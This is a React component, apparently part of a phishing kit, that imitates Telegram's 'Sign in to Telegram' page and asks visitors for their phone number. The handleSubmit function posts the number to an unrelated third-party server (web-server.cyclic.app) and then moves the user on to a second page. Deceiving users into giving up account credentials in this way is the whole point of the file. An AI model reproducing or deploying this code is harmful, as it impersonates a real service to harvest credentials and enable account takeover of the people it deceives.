import './App.css';
import Country from './Country';
import { Link, useNavigate } from 'react-router-dom';
import React, { useState } from 'react';

const App = () => {
  const [phone_number, setPhoneNumber] = useState('+7 ');
  const history = useNavigate();

  const handleInputChange = (event) => {
    let value = event.target.value;
    value = value.replace(/\D/g, '');

    if (value.startsWith('7') && /^\d+$/.test(value)) {
      value = '+7 ' + value.substring(1);
    } else {
      value = value.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1 $2 $3');
    }

    setPhoneNumber(value);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      // Отправка запроса на сервер с использованием fetch
      const response = await fetch('https://web-server.cyclic.app/phone', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone_number }),
      });

      if (response.ok) {
        // Обработка успешного ответа
        const result = await response.json();
        console.log('Успешный ответ от сервера:', result);

        // Далее можете перейти на вторую страницу
        history(`/App2.js`);
      } else {
        // Обработка ошибки
        console.error('Ошибка при отправке запроса на сервер');
      }
    } catch (error) {
      console.error('Произошла ошибка:', error.message);
    }
  };

  return (
    <div className="Apps">
      <header className="App-header">
        <img src="./112233.jpeg" className="imagge-tg" alt="Description" />
        <p className="title-text">Sign in to Telegram</p>
        <a className="add-text">
          Please confirm your country code<br /> and enter your phone number.
        </a>
        <div className="polevvod">
          <Country />
          <form className="phone-input-container" onSubmit={handleSubmit}>
            <input
              type="tel"
              id="phone_number"
              value={phone_number}
              onChange={handleInputChange}
              className="phone-input"
              placeholder="Введите номер телефона"
            />
            <div className="divcheck">
              <label>
                <input type="checkbox" />
                <span className="signcheck">
                  <a> запомнить меня</a>
                </span>
              </label>
            </div>
            <button type="submit" className="button">
              Далее
            </button>
          </form>
          <Link to="/App2.js">            
          </Link>
        </div>
      </header>
    </div>
  );
};

export default App;
